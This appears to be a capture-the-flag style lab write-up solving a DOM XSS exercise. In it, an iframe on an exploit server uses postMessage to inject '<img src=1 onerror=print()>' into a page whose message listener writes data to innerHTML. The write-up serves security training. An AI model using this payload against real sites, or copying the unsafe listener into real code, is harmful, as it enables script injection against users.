## DOM XSS using web messages

This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to post a message to the target site that causes the `print()` function to be called.

## Notes

- Exploit Server
- ads feature
- EventListener for message in home page

## Resume

1. Identify the `message` event listener
2. Confirm that web messages are inserted into the DOM
3. Create an iframe pointing to the vulnerable page
4. Send a malicious payload using `postMessage()`
5. Trigger DOM XSS through the vulnerable sink
6. Deliver the exploit to the victim

## Solve

Inspect the home page source code and notice the following behavior:

```javascript
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})
```

The application listens for incoming web messages and directly injects the received data into the page using `innerHTML`.

Go to the exploit server and create the following payload:

```html
<iframe
    src="https://0abd00ca042a48d880f48026001a0068.web-security-academy.net/"
    onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

Store the exploit and deliver it to the victim.

When the iframe loads:

1. The victim loads the vulnerable page inside the iframe
2. The `onload` event is triggered
3. `postMessage()` sends the malicious HTML payload to the iframe
4. The vulnerable page receives the message through the `message` event listener
5. The payload is inserted into the DOM using `innerHTML`

Injected payload:

```html
<img src=1 onerror=print()>
```

Because the image source is invalid, the `onerror` event fires automatically and executes the JavaScript payload:

```javascript
print()
```

This successfully triggers the DOM XSS and solves the lab.


